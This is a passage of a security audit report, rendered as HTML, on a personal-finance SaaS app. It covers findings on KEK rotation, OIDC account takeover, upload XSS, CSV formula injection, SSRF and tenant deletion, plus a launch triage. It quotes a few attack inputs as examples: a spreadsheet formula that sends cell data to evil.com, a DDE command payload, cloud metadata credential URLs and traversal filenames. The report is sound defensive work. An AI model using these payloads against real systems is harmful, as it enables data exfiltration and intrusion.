+<h3 id="f-15-no-kek-rotation-function-p2-fixed-2026-05-25">F-15 — No KEK rotation function (P2) ✅ Fixed 2026-05-25<a class="heading-anchor" href="#f-15-no-kek-rotation-function-p2-fixed-2026-05-25">#</a></h3>
+<p><strong>Status: RESOLVED.</strong> This finding bit us in real-time during the audit when we rotated the test-server KEK without re-wrapping the DEKs — every subsequent attachment upload hit &quot;Unsupported state or unable to authenticate data&quot; (AES-GCM tag mismatch).</p>
+<p><strong>Resolution</strong>:</p>
+<ul>
+<li>Added <code>server/src/attachments/kek-rotation.ts</code> exporting <code>rotateKek(oldKek, newKek)</code> that rewraps every <code>tenant_encryption_keys.wrapped_dek</code>, re-encrypts every <code>plaid_items.access_token_encrypted</code>, and re-encrypts every <code>ofx_dc_connections.{username,password}_encrypted</code> in a single DB transaction.</li>
+<li>Added <code>scripts/rotate-kek.mjs</code> CLI (npm script <code>rotate-kek</code>) that generates a fresh KEK (or accepts a specific one), confirms with the operator, runs the rotation, and atomically swaps <code>.env</code> with a <code>.env.bak.&lt;timestamp&gt;</code> backup.</li>
+<li>Added <code>docs/RUNBOOK_KEK_ROTATION.md</code> with the full procedure, pre-flight checks (take a backup!), and recovery paths.</li>
+<li>Side-fix in <code>server/src/domain/settings.ts:295-309</code>: the <code>ATTACHMENT_ENCRYPTION_KEY</code> setter checked base64-regex before hex-regex, but a 64-char hex string also matches the base64 regex and decodes to 48 bytes (wrong). Reordered: hex check first.</li>
+<li>Integration test at <code>server/tests/integration/kek-rotation.test.ts</code> (7 cases) pins the contract.</li>
+</ul>
+<p><strong>Original finding text</strong> (preserved for context):</p>
+<blockquote>
+<p>The codebase has <code>rotateTenantKey()</code> which rotates a tenant&#39;s DEK (re-encrypts everything under the new DEK, rewraps with the <strong>current</strong> KEK). There is <strong>no function that rotates the KEK itself</strong>. Swapping <code>ATTACHMENT_ENCRYPTION_KEY</code> to a new value bricks every existing attachment (DEKs can no longer be unwrapped).</p>
+</blockquote>
+<hr>
+<h3 id="f-16-ai-assistant-tool-surface-structurally-bulletproof-no-finding">F-16 — AI Assistant tool surface: structurally bulletproof (no finding)<a class="heading-anchor" href="#f-16-ai-assistant-tool-surface-structurally-bulletproof-no-finding">#</a></h3>
+<p>All 17 tools in <code>server/src/domain/assistant/tools.ts</code> use <code>ctx.tenantId</code> (closure-captured from the authenticated session) in their SQL. No tool accepts <code>tenantId</code> as an input parameter, so the model — even under a successful prompt injection — cannot supply a different tenant. Confirmed by grep + line-by-line review.</p>
+<p>The runtime (<code>server/src/domain/assistant/runtime.ts</code>) feeds the model only the user&#39;s chat messages + a static system prompt; the tenant ID is never in the conversation. Message history is sanitized (role + content only), capped at 40 turns, 4096 tokens/response, 8 tool-use iterations max. Write tools each call <code>recordAudit()</code>.</p>
+<p>Worst case from prompt injection: model wastes the user&#39;s own quota and produces confused output within the user&#39;s own tenant. No cross-tenant exfil possible.</p>
+<p>(Couldn&#39;t empirically test prompt injection because A is on free tier — 402 on <code>/api/assistant/chat</code>. Structural review is sufficient because the SQL pattern is uniform.)</p>
+<hr>
+<h3 id="f-17-plaid-token-storage-encrypted-at-rest-tenant-scoped-no-finding-with-note">F-17 — Plaid token storage: encrypted-at-rest, tenant-scoped (no finding, with note)<a class="heading-anchor" href="#f-17-plaid-token-storage-encrypted-at-rest-tenant-scoped-no-finding-with-note">#</a></h3>
+<ul>
+<li><code>plaid_items.access_token_encrypted</code> is <code>bytea</code> containing <code>[12-byte IV][ciphertext][16-byte GCM tag]</code>.</li>
+<li>Uses <code>domain/crypto.ts</code> (AES-256-GCM) with the KEK directly (no per-tenant DEK wrap — this is a deliberate choice for short DB-resident secrets).</li>
+<li>Every Plaid route calls <code>requireTenant()</code> and every SQL has <code>WHERE tenant_id = $</code>.</li>
+</ul>
+<p>⚠️ Note: shares the KEK with attachments. F-13 applies — KEK leak compromises Plaid tokens too.</p>
+<hr>
+<h3 id="f-18-entitlement-bypass-gates-hold-no-finding">F-18 — Entitlement bypass: gates hold (no finding)<a class="heading-anchor" href="#f-18-entitlement-bypass-gates-hold-no-finding">#</a></h3>
+<p>Direct API hits from a free-tier session against paid-only endpoints all returned 402 &quot;No active subscription on this tenant&quot;:</p>
+<ul>
+<li><code>/api/assistant/chat</code> → 402</li>
+<li><code>/api/plaid/link-token</code> → 402</li>
+<li><code>/api/anomalies</code> → 402</li>
+<li><code>/api/split-participants</code> (Family-only) → 402</li>
+</ul>
+<p>Header/body forgery to spoof entitlement does not propagate — entitlement is read fresh from the DB per request via <code>requireFeature(tenantId, FEATURE)</code>.</p>
+<hr>
+<h3 id="f-19-email-change-ato-not-exploitable-no-finding">F-19 — Email-change ATO: not exploitable (no finding)<a class="heading-anchor" href="#f-19-email-change-ato-not-exploitable-no-finding">#</a></h3>
+<p>There is <strong>no user-facing email-change endpoint at all</strong>. <code>PATCH /api/auth/me</code> accepts only <code>name</code> and <code>timezone</code> — an <code>email</code> key in the body is silently ignored. Verified empirically.</p>
+<p>This is the most secure stance possible. Minor UX note: users would need operator intervention to change their email — worth a product-backlog ticket.</p>
+<hr>
+<h3 id="f-20-oidc-email-based-identity-auto-linking-account-takeover-p1">F-20 — OIDC: email-based identity auto-linking → account takeover (P1)<a class="heading-anchor" href="#f-20-oidc-email-based-identity-auto-linking-account-takeover-p1">#</a></h3>
+<p><code>server/src/auth/identities.ts:59-89</code> — when an OIDC callback returns an identity for a <code>providerUserId</code> not yet in <code>user_identities</code>, the resolver looks up users by <code>LOWER(email) = LOWER($claim_email)</code> and <strong>auto-links the new OIDC identity to that user with no out-of-band confirmation and no <code>email_verified</code> claim check</strong>.</p>
+<p>Attack scenario: an attacker who can get any enabled OIDC provider to issue a token claiming <code>email: victim@example.com</code> is instantly logged in as the victim — no password, no 2FA, no email loop.</p>
+<p>Routes to this code path:</p>
+<ul>
+<li>A misconfigured IdP that lets users set arbitrary unverified email</li>
+<li>A second OIDC provider added by a super-admin (Auth0, Okta dev tenants, self-hosted)</li>
+<li>An IdP that allows email change without re-verification</li>
+</ul>
+<p><strong>Compounding</strong>: <code>oidc.ts:172-173</code> deliberately skips id_token signature verification (&quot;the token came over a direct TLS POST&quot;). An attacker controlling TLS interception or with a malicious-yet-valid cert could forge tokens entirely.</p>
+<p>OIDC is currently <strong>disabled</strong> on the test server (only <code>local</code> provider listed) — finding is latent.</p>
+<p><strong>Fix</strong> (any of these would mitigate; ideally all three):</p>
+<ol>
+<li>Refuse to auto-link unless the id_token has <code>email_verified: true</code>.</li>
+<li>On first link, require an email-loop confirmation to the local user&#39;s address (&quot;an OIDC provider X is claiming this email — confirm?&quot;).</li>
+<li>Verify id_token signature against the provider&#39;s JWKS endpoint.</li>
+</ol>
+<p>File: <code>server/src/auth/identities.ts:59</code>, <code>server/src/auth/providers/oidc.ts:170-188</code>.</p>
+<hr>
+<h3 id="f-21-file-upload-accepts-contentmime-mismatch-xss-via-attachment-p2">F-21 — File upload accepts content/MIME mismatch → XSS-via-attachment (P2)<a class="heading-anchor" href="#f-21-file-upload-accepts-contentmime-mismatch-xss-via-attachment-p2">#</a></h3>
+<p>The attachments endpoint allowlists 4 MIME types (<code>jpeg/png/webp/pdf</code>) but only checks the <strong>claimed</strong> Content-Type, not the file&#39;s magic bytes:</p>
+<ul>
+<li>Uploading an SVG file with <code>Content-Type: application/pdf</code> succeeds — file is stored with <code>mime_type=application/pdf</code> but content is the SVG.</li>
+<li>Uploading HTML with <code>Content-Type: application/pdf</code> succeeds.</li>
+<li>Filename traversal (<code>../../../etc/evil.pdf</code>) is correctly stripped → filename: <code>evil.pdf</code> ✓</li>
+<li>Shell metacharacters in filename sanitized (<code>$(id).pdf</code> → <code>_id_.pdf</code>) ✓</li>
+<li>26MB upload → 413 (25MB limit holds) ✓</li>
+</ul>
+<p>Combined with F-04 (no <code>X-Content-Type-Options: nosniff</code>) and the preview endpoint serving <code>Content-Disposition: inline</code>, a browser may sniff the actual SVG content and execute embedded <code>&lt;script&gt;</code> in the SmrtCash origin. The download endpoint uses <code>attachment</code> disposition (good), but <code>/api/attachments/:id/preview</code> uses <code>inline</code>.</p>
+<p><strong>Fix</strong>:</p>
+<ol>
+<li>Validate the uploaded file&#39;s magic bytes match the claimed Content-Type (npm <code>file-type</code> package, or hand-rolled match for JPEG <code>FF D8 FF</code>, PNG <code>89 50 4E 47</code>, WebP <code>RIFF…WEBP</code>, PDF <code>25 50 44 46</code>).</li>
+<li>Add <code>X-Content-Type-Options: nosniff</code> to attachment responses (or globally via Helmet — see F-04).</li>
+<li>Consider serving attachments from a separate cookieless subdomain so even successful XSS can&#39;t read session cookies.</li>
+</ol>
+<p>File: <code>server/src/routes/attachments.ts:91</code> (upload handler), <code>:264</code> and <code>:291</code> (download + preview handlers).</p>
+<hr>
+<h3 id="f-22-csv-export-is-formula-injectable-p2">F-22 — CSV export is formula-injectable (P2)<a class="heading-anchor" href="#f-22-csv-export-is-formula-injectable-p2">#</a></h3>
+<p><code>csvCell()</code> in <code>server/src/routes/transactions.ts:35</code> and <code>server/src/routes/tax-year.ts:144</code> quotes and escapes embedded <code>&quot;</code> but does <strong>not</strong> prefix <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code>, or <code>\r</code> with a single-quote / tab / apostrophe.</p>
+<p>Attack: a household member&#39;s malicious transaction description (e.g., <code>=HYPERLINK(&quot;http://evil.com/?leak=&quot;&amp;A1&amp;B1,&quot;Click&quot;)</code> or <code>=cmd|&#39;/c calc&#39;!A1</code>) becomes a live Excel formula when the household admin exports for taxes.</p>
+<p><strong>Fix</strong>: in <code>csvCell()</code>, if the value starts with one of <code>= + - @ \t \r</code>, prefix with a single quote <code>&#39;</code> (Excel&#39;s standard &quot;treat as literal text&quot; prefix). Three-line change.</p>
+<hr>
+<h3 id="f-23-ofx-direct-connect-url-no-ssrf-guardrails-p2">F-23 — OFX Direct Connect URL: no SSRF guardrails (P2)<a class="heading-anchor" href="#f-23-ofx-direct-connect-url-no-ssrf-guardrails-p2">#</a></h3>
+<p><code>server/src/routes/ofx-dc.ts:425</code> validates only <code>/^https?:\/\//.test(ofxUrl)</code>. No block on:</p>
+<ul>
+<li><code>http://127.0.0.1:5432/</code> (Postgres)</li>
+<li><code>http://169.254.169.254/latest/meta-data/</code> (AWS IMDS — <code>iam/security-credentials/&lt;role&gt;</code> returns temp creds if running on EC2)</li>
+<li><code>http://192.168.x.x</code>, <code>10.x.x.x</code>, <code>172.16-31.x.x</code> (private)</li>
+<li>DNS rebinding (resolver returns 8.8.8.8 on validation, 127.0.0.1 on fetch)</li>
+</ul>
+<p>Exploit requires a paying customer with the BANK_SYNC feature (Plus/Family tier). Once configured, the server initiates an HTTP POST to the URL with OFX credentials in body.</p>
+<p>Same SSRF surface on <code>OLLAMA_BASE_URL</code> (super-admin only — lower urgency).</p>
+<p><strong>Fix</strong>: in <code>validateUrlSetting()</code> and the OFX DC validator, resolve the hostname to IPs at validation time and refuse to save if any resolved IP is in:</p>
+<ul>
+<li>127.0.0.0/8, ::1, fe80::/10</li>
+<li>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</li>
+<li>169.254.0.0/16</li>
+<li>fc00::/7</li>
+</ul>
+<p>Also resolve+check <strong>at fetch time</strong> to defeat DNS rebinding.</p>
+<p>File: <code>server/src/routes/settings.ts:46</code> (validateUrlSetting), <code>server/src/routes/ofx-dc.ts:425</code>.</p>
+<hr>
+<h3 id="f-24-npm-audit-clean-no-finding">F-24 — npm audit: clean (no finding)<a class="heading-anchor" href="#f-24-npm-audit-clean-no-finding">#</a></h3>
+<p><code>npm audit --prefix server</code> and <code>npm audit --prefix web</code> both returned zero vulnerabilities at every severity. argon2, fastify, pg, stripe, @anthropic-ai/sdk are all current.</p>
+<hr>
+<h3 id="f-25-concurrent-signup-race-uncaught-500s-p3">F-25 — Concurrent signup race: uncaught 500s (P3)<a class="heading-anchor" href="#f-25-concurrent-signup-race-uncaught-500s-p3">#</a></h3>
+<p>5 parallel signup requests for the same email returned 2 × 500, 3 × 202. The 500s come from a duplicate-key violation on the <code>users.email</code> UNIQUE constraint — the per-request <code>EXISTS</code> check (<code>auth.ts:298-322</code>) is not transactional with the INSERT, so two simultaneous requests can both pass the check and one fails to commit.</p>
+<p>Practical impact:</p>
+<ul>
+<li>DB integrity preserved (1 user, 1 row).</li>
+<li>Two callers see a 500 (info leak: signals concurrent-request handling weakness).</li>
+<li>Three callers see normal 202.</li>
+</ul>
+<p><strong>Fix</strong>: wrap the existence check + INSERT in <code>withTransaction</code> with <code>ON CONFLICT (email) DO NOTHING</code> semantics, or catch the duplicate-key error and convert to a 202 (idempotent response).</p>
+<p>File: <code>server/src/routes/auth.ts:268</code>.</p>
+<hr>
+<h3 id="f-26-log-scrubbing-clean-no-finding">F-26 — Log scrubbing: clean (no finding)<a class="heading-anchor" href="#f-26-log-scrubbing-clean-no-finding">#</a></h3>
+<p><code>docker logs --tail 1000 smrtcash-app</code> was scanned for:</p>
+<ul>
+<li><code>password</code>, <code>Bearer …</code>, session cookie payloads, <code>smrt_&lt;token&gt;</code> API keys, <code>whsec_…</code>, <code>sk_test_/sk_live_…</code>, Plaid access tokens, <code>verify_url</code>, <code>reset_url</code></li>
+</ul>
+<p>Zero matches. The mailer&#39;s &quot;verify URL not sent&quot; warning (auth.ts:144) DOES include <code>verifyUrl</code> in the log entry — but only when SMTP send fails. Since SMTP is configured (Maileroo) on the test server, this path doesn&#39;t trigger. Worth keeping an eye on: if SMTP ever flaps, verify links go to logs. Acceptable for now since logs are operator-only.</p>
+<hr>
+<h3 id="f-27-tls-hsts-cert-chain-clean-no-finding">F-27 — TLS / HSTS / cert chain: clean (no finding)<a class="heading-anchor" href="#f-27-tls-hsts-cert-chain-clean-no-finding">#</a></h3>
+<ul>
+<li>TLS 1.3 only</li>
+<li>Cert: Google Trust Services, valid chain</li>
+<li>HSTS: <code>max-age=63072000; preload</code> (2-year, preload-eligible)</li>
+<li>Cipher: TLS_AES_256_GCM_SHA384</li>
+</ul>
+<hr>
+<h3 id="f-28-dmarc-duplicate-record-on-builditsmrtcom-p1">F-28 — DMARC duplicate record on builditsmrt.com (P1)<a class="heading-anchor" href="#f-28-dmarc-duplicate-record-on-builditsmrtcom-p1">#</a></h3>
+<p>DNS lookup of <code>_dmarc.builditsmrt.com</code> returns <strong>two</strong> TXT records:</p>
+<pre><code>v=DMARC1; p=none;
+v=DMARC1; p=reject;
+</code></pre>
+<p>Per RFC 7489 §6.6.3: if multiple DMARC records are returned, the Mail Receiver MUST NOT apply DMARC policy. So DMARC is <strong>effectively disabled</strong> — your verify/reset/dunning emails are spoofable by any sender, and &quot;<a href="mailto:noreply@builditsmrt.com">noreply@builditsmrt.com</a>&quot; From-line is unprotected.</p>
+<p>Also: neither record has a <code>rua=mailto:…</code> reporting address, so even if it worked, you&#39;d never see failure reports.</p>
+<p>SPF on <code>builditsmrt.com</code> is in place: <code>v=spf1 include:_spf.maileroo.com ~all</code> ✓ (soft-fail; consider tightening to <code>-all</code> once you&#39;ve confirmed Maileroo is the only sender). DKIM under common selectors (<code>maileroo</code>, <code>mr1</code>, <code>mr2</code>, <code>selector1</code>, etc.) returned empty — Maileroo&#39;s actual selector needs to be confirmed against their dashboard and the matching TXT record added.</p>
+<p><strong>Fix</strong>:</p>
+<ol>
+<li>Delete the <code>v=DMARC1; p=none;</code> TXT record at <code>_dmarc.builditsmrt.com</code>. Keep only <code>v=DMARC1; p=reject; rua=mailto:dmarc-reports@builditsmrt.com; pct=100</code>.</li>
+<li>Confirm Maileroo&#39;s actual DKIM selector and add the corresponding TXT record.</li>
+<li>Send a test email through Maileroo and check the received headers for <code>dkim=pass</code>, <code>spf=pass</code>, <code>dmarc=pass</code>.</li>
+</ol>
+<hr>
+<h3 id="f-29-git-history-secret-scan-clean-no-finding">F-29 — Git history secret scan: clean (no finding)<a class="heading-anchor" href="#f-29-git-history-secret-scan-clean-no-finding">#</a></h3>
+<p><code>git log --all -p | grep -E &quot;(sk_live_|whsec_|AKIA|PRIVATE KEY)&quot;</code> returned only docs/placeholders (<code>docs/STRIPE_SETUP.md</code> has <code>sk_test_…</code> examples) and test-fixture passwords (<code>correct-horse-battery-staple</code> constants). No real committed secrets.</p>
+<hr>
+<h3 id="f-30-frontend-bundle-clean-no-finding">F-30 — Frontend bundle: clean (no finding)<a class="heading-anchor" href="#f-30-frontend-bundle-clean-no-finding">#</a></h3>
+<ul>
+<li>No source maps in production (<code>assets/index-CTbB6Hjm.js.map</code> → 404)</li>
+<li>No hardcoded API/Stripe/AWS/Google keys (grep across the 992KB bundle)</li>
+<li>No leaked <code>VITE_*</code> env values</li>
+<li>&quot;localhost&quot; reference is a URL-construction fallback for SSR-like guard — not a leak</li>
+</ul>
+<hr>
+<h3 id="f-31-container-hardening-mostly-good-rootfs-not-readonly-p3">F-31 — Container hardening: mostly good, rootfs not readonly (P3)<a class="heading-anchor" href="#f-31-container-hardening-mostly-good-rootfs-not-readonly-p3">#</a></h3>
+<ul>
+<li>Running as uid=1000(node) — NOT root ✓</li>
+<li>Dockerfile has explicit <code>USER node</code> (line 46) ✓</li>
+<li>Container is NOT <code>privileged</code> ✓</li>
+<li>No added Linux capabilities ✓</li>
+<li>⚠️ <code>ReadonlyRootfs: false</code> — would be defense-in-depth to set rootfs read-only with a tmpfs for <code>/tmp</code> and an explicit RW volume for <code>/data</code>.</li>
+<li>⚠️ No <code>security_opt: [&quot;no-new-privileges:true&quot;]</code>, no AppArmor/seccomp profile specified.</li>
+</ul>
+<p>P3. Lower priority than the listed P0/P1 items.</p>
+<hr>
+<h3 id="f-32-audit-log-integrity-no-app-layer-mutation-path-no-db-layer-guard-p2">F-32 — Audit log integrity: no app-layer mutation path; no DB-layer guard (P2)<a class="heading-anchor" href="#f-32-audit-log-integrity-no-app-layer-mutation-path-no-db-layer-guard-p2">#</a></h3>
+<p>Reviewed <code>server/src/routes/</code> — every <code>audit_log</code> reference is an INSERT (via <code>recordAudit()</code>). No UPDATE or DELETE statement against <code>audit_log</code> exists anywhere in the codebase. A tenant_admin has no API path to tamper.</p>
+<p>⚠️ However: there&#39;s no DB-layer guard (no trigger, no role-level permission). If app-level SQL injection ever opens up (none found in this audit), audit rows could be mutated. Pure defense-in-depth.</p>
+<p><strong>Fix</strong> (optional): create a Postgres trigger <code>BEFORE UPDATE OR DELETE ON audit_log</code> that raises an exception. Or a per-table role grant that only allows INSERT to the app role. Either way: even compromised app-level SQL can&#39;t rewrite history.</p>
+<hr>
+<h3 id="f-33-no-compliance-pages-p1">F-33 — No compliance pages (P1)<a class="heading-anchor" href="#f-33-no-compliance-pages-p1">#</a></h3>
+<p><code>/privacy</code>, <code>/terms</code>, <code>/cookies</code>, <code>/legal</code>, <code>/privacy-policy</code>, <code>/terms-of-service</code>, <code>/about</code> — every probe returns the SPA index.html (same content/size as <code>/</code>). There are no <code>web/src/pages/Privacy*</code> or <code>Terms*</code> components in the codebase. No cookie-consent banner exists.</p>
+<p>For a SaaS that:</p>
+<ul>
+<li>Stores financial data (potential PII + sensitive personal info)</li>
+<li>Charges customers via Stripe (CCPA/state-level requirements)</li>
+<li>Sends marketing or transactional emails (CAN-SPAM)</li>
+<li>Will likely have EU/EEA traffic (GDPR)</li>
+</ul>
+<p>…this is a launch-blocker for charging real customers.</p>
+<p><strong>Fix</strong>: at minimum ship a Privacy Policy and Terms of Service before flipping Stripe to live. Footer links from public pages (login/signup) to both. A cookie notice is nice but the SameSite=Strict-only &quot;strictly necessary&quot; cookies arguably don&#39;t require explicit GDPR consent. Lawyer-review recommended either way.</p>
+<hr>
+<h3 id="f-34-tenant-deletion-fk-constraints-not-cascade-p1">F-34 — Tenant deletion FK constraints not CASCADE (P1)<a class="heading-anchor" href="#f-34-tenant-deletion-fk-constraints-not-cascade-p1">#</a></h3>
+<p><code>server/src/routes/system.ts:146</code> runs <code>DELETE FROM tenants WHERE id = $1</code> and expects it to work. But of the ~30 tenant_id FK constraints on data tables, only ~10 are <code>ON DELETE CASCADE</code>. The rest (accounts, transactions, attachments, categories, normalization_rules, transaction_splits, recurring_suggestions, budgets, savings_goals, bills, recurring_income, holdings, vehicles, commute_routes, route_vehicle_assignments, fuel_prices, category_suggestions, import_batches) <strong>default to NO ACTION = RESTRICT</strong>.</p>
+<p>So <code>DELETE FROM tenants</code> will throw a foreign-key violation for any tenant that has ever had data. The super-admin &quot;delete tenant&quot; feature is effectively broken — and the error is currently returned as a 500 with a raw Postgres error message.</p>
+<p>Also: there&#39;s <strong>no disk cleanup of attachments</strong> when a tenant is deleted. Even if the DB delete succeeded, the encrypted attachment files would remain forever in <code>/data/attachments/…</code>.</p>
+<p>And: <strong>no Stripe customer cleanup</strong> — the Stripe customer object persists. If the customer had an active subscription, it keeps billing until canceled manually.</p>
+<p><strong>Fix</strong> (this is a multi-step job):</p>
+<ol>
+<li>Alter every tenant_id FK to <code>ON DELETE CASCADE</code>.</li>
+<li>Wrap the tenant delete in a transaction that:<ul>
+<li>Looks up every attachment storage_path for the tenant,</li>
+<li>Looks up the Stripe customer ID,</li>
+<li>DELETEs the tenant (cascade handles DB),</li>
+<li>Cancels the Stripe subscription + deletes the Stripe customer,</li>
+<li><code>unlink()</code>s the attachment files.</li>
+</ul>
+</li>
+<li>Add a corresponding <code>DELETE /api/auth/me</code> (or <code>/api/me/account</code>) for user-initiated self-deletion → see F-35.</li>
+</ol>
+<hr>
+<h3 id="f-35-no-user-initiated-accounttenant-deletion-gdprccpa-p1">F-35 — No user-initiated account/tenant deletion (GDPR/CCPA) (P1)<a class="heading-anchor" href="#f-35-no-user-initiated-accounttenant-deletion-gdprccpa-p1">#</a></h3>
+<p>A user has no in-app path to delete their own account or tenant. The only deletion path is super-admin <code>DELETE /api/system/tenants/:id</code> (which is broken — see F-34).</p>
+<p>For a SaaS that accepts EU/EEA traffic, GDPR Article 17 (&quot;Right to erasure&quot;) requires user-initiated deletion as a self-service flow. CCPA has a similar requirement for California users.</p>
+<p><strong>Fix</strong>: add a <code>DELETE /api/me/account</code> (or two-step &quot;request → confirm&quot; flow) that triggers the full tenant-deletion procedure from F-34. Audit-log the request. Send a confirmation email.</p>
+<hr>
+<h3 id="f-36-session-membership-desync-removed-users-retain-tenant-access-p1">F-36 — Session-membership desync: removed users retain tenant access (P1)<a class="heading-anchor" href="#f-36-session-membership-desync-removed-users-retain-tenant-access-p1">#</a></h3>
+<p>Empirical repro:</p>
+<ol>
+<li>User A is admin of tenant T (membership row exists, session active_tenant_id=T).</li>
+<li>Admin removes A from T: <code>DELETE FROM memberships WHERE user_id=A AND tenant_id=T</code>.</li>
+<li>A&#39;s existing session cookie still works.</li>
+<li><code>GET /api/accounts</code> with A&#39;s cookie → <strong>returns every account in T</strong>.</li>
+<li><code>GET /api/auth/me</code> correctly returns <code>memberships: []</code> but <code>active_tenant_id: &lt;T&gt;</code> — the UI knows A isn&#39;t a member, but the API still serves T&#39;s data.</li>
+</ol>
+<p>The auth gate reads <code>req.user.tenantId</code> from the session&#39;s <code>active_tenant_id</code> and grants access without re-checking membership.</p>
+<p><strong>Concrete scenarios</strong>:</p>
+<ul>
+<li>Family plan: admin spouse removes child or other spouse → removed party retains access for up to 7 days.</li>
+<li>Compromised admin: revoking their membership doesn&#39;t kick them out.</li>
+<li>Role downgrade: not tested but likely the same — <code>loadUserContext()</code> runs once per request but the session&#39;s tenant ID is still trusted.</li>
+</ul>
+<p>Notably: <code>loadSession()</code> DOES re-check <code>users.is_super_admin</code> on every request (<code>auth/sessions.ts:loadSession</code>), so super-admin status IS refreshed. But tenant membership is not.</p>
+<p><strong>Fix</strong> (either approach):</p>
+<ol>
+<li><strong>Per-request membership check</strong> (correct but +1 DB hit): in the auth gate (<code>app.ts:165-234</code>), after loading the session, verify <code>EXISTS(SELECT 1 FROM memberships WHERE user_id=$1 AND tenant_id=$2)</code> before letting the request proceed with <code>req.user.tenantId</code>. If not, set <code>req.user.tenantId = null</code> and let <code>requireTenant</code> 403.</li>
+<li><strong>On-delete session invalidation</strong> (lighter weight, eventual consistency): when a membership row is deleted, run <code>UPDATE sessions SET active_tenant_id = NULL WHERE user_id = $1 AND active_tenant_id = $2</code>. The session keeps working but stops granting access to T.</li>
+</ol>
+<p>Approach 2 is cheaper but misses the case of &quot;active_tenant_id was set after the membership delete&quot; (impossible in current code, but worth noting). Approach 1 is the durable fix.</p>
+<hr>
+<h3 id="f-37-ofx-parser-is-xxe-safe-no-finding">F-37 — OFX parser is XXE-safe (no finding)<a class="heading-anchor" href="#f-37-ofx-parser-is-xxe-safe-no-finding">#</a></h3>
+<p>Hand-rolled SGML/XML parser in <code>server/src/import/parsers/ofx.ts</code>. Skips processing instructions and comments (line 130: <code>if (raw.startsWith(&#39;!&#39;) || raw.startsWith(&#39;?&#39;)) continue;</code>). Entity decoding is whitelisted to <code>&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;apos;</code> plus numeric character references — no external entity resolution.</p>
+<hr>
+<h2 id="triage-for-022x-launch-readiness">Triage for 0.22.x launch readiness<a class="heading-anchor" href="#triage-for-022x-launch-readiness">#</a></h2>
+<p>If the goal is &quot;ship Stripe live tomorrow&quot;, the order should be:</p>
+<p><strong>P0 — fix today, rotate keys, redo backup:</strong></p>
+<ul>
+<li>F-13 (backup snapshot leaks SESSION_SECRET + KEK + Stripe creds)<ol>
+<li>Remove secret-class keys from <code>KNOWN_SETTINGS</code> env-snapshot capture.</li>
+<li>Delete existing <code>env.snapshot.json</code> files from the test server.</li>
+<li>Rotate SESSION_SECRET and ATTACHMENT_ENCRYPTION_KEY on test (they were in the audit transcript). </li>
+<li><strong>Before launching prod</strong>, ensure prod&#39;s KEK is fresh and never lived in a backup file.</li>
+</ol>
+</li>
+</ul>
+<p><strong>P1 — block live-mode launch:</strong></p>
+<ul>
+<li>F-01 (login rate limit) — Cloudflare WAF or <code>login_attempts</code> table</li>
+<li>F-02 (password-reset timing) — background-queue the email send for symmetric latency</li>
+<li>F-03 (sibling reset tokens) — <code>DELETE password_resets WHERE user_id=$1 AND consumed_at IS NULL</code> after a successful reset</li>
+<li>F-04 (security headers) — register <code>@fastify/helmet</code></li>
+<li>F-20 (OIDC email auto-link ATO) — require <code>email_verified</code> + email-loop confirmation on first link, verify id_token signature</li>
+<li>F-28 (DMARC duplicate record) — delete the <code>p=none;</code> record, add <code>rua=…</code>, confirm Maileroo DKIM selector</li>
+<li>F-33 (privacy / terms / cookie pages missing) — minimum viable Privacy Policy + Terms of Service shipped</li>
+<li>F-34 (tenant delete broken) — make tenant_id FKs ON DELETE CASCADE + actually clean up attachments + Stripe customer</li>
+<li>F-35 (no user self-deletion) — required for GDPR Article 17</li>
+<li>F-36 (session-membership desync) — per-request membership check OR on-delete session invalidation</li>
+</ul>
+<p><strong>P2 — land in 0.22.x but not strictly blocking:</strong></p>
+<ul>
+<li>F-05 (session rotation on login)</li>
+<li>F-06 (login timing)</li>
+<li>F-07 (password policy — raise to 12 chars, add HIBP check)</li>
+<li>F-08 (password-reset rate limit) </li>
+<li>F-09 (JSON parser error mapping)</li>
+<li>F-15 (KEK rotation function)</li>
+<li>F-21 (file content/MIME validation via magic bytes)</li>
+<li>F-22 (CSV formula injection — prefix <code>=+-@\t\r</code> with single-quote)</li>
+<li>F-23 (OFX URL SSRF — block private IPs + DNS rebinding)</li>
+<li>F-32 (audit-log DB-layer trigger)</li>
+</ul>
+<p><strong>P3 / backlog:</strong></p>
+<ul>
+<li>F-10/F-11 (active sessions UI, server-side idle timeout)</li>
+<li>F-12 (API key expiry + granular scopes)</li>
+<li>F-25 (concurrent signup 500s — wrap in transaction with ON CONFLICT)</li>
+<li>F-31 (read-only container rootfs, seccomp profile, no-new-privileges)</li>
+<li>Email-change endpoint (UX, not security)</li>
+</ul>
+<p><strong>Rough effort estimates</strong> (if a single engineer does them sequentially):</p>
+<ul>
+<li>P0: 1-2 hours (mostly redo backup snapshot + delete files + rotate keys).</li>
+<li>P1 batch: ~2 work-days. The big-ticket items are F-33 (legal pages — depends on lawyer turnaround for content), F-34 (cascade migration + Stripe cleanup), F-35 (self-delete flow + tests), F-36 (per-request membership check + cache).</li>
+<li>P2 batch: ~1 work-day.</li>
+</ul>
+<p>If lawyer-turnaround on privacy/terms is the long pole, everything else can ship in 2 days.</p>
+<hr>
+<h2 id="cleanup-commands-run-when-done-with-test-data">Cleanup commands (run when done with test data)<a class="heading-anchor" href="#cleanup-commands-run-when-done-with-test-data">#</a></h2>
+<pre><code class="language-sh">ssh srv928192 &quot;docker exec smrtcash-db psql -U smrtcash -d smrtcash -c \&quot;
+  DELETE FROM email_verifications WHERE user_id IN (SELECT id FROM users WHERE email LIKE &#39;sectest-%@example.invalid&#39;);
+  DELETE FROM password_resets       WHERE user_id IN (SELECT id FROM users WHERE email LIKE &#39;sectest-%@example.invalid&#39;);
+  DELETE FROM sessions              WHERE user_id IN (SELECT id FROM users WHERE email LIKE &#39;sectest-%@example.invalid&#39;);
+  DELETE FROM api_keys              WHERE user_id IN (SELECT id FROM users WHERE email LIKE &#39;sectest-%@example.invalid&#39;);
+  DELETE FROM memberships           WHERE user_id IN (SELECT id FROM users WHERE email LIKE &#39;sectest-%@example.invalid&#39;);
+  DELETE FROM accounts              WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE &#39;Sec Test %&#39;);
+  DELETE FROM budgets               WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE &#39;Sec Test %&#39;);
+  DELETE FROM goals                 WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE &#39;Sec Test %&#39;);
+  DELETE FROM tenants               WHERE name LIKE &#39;Sec Test %&#39;;
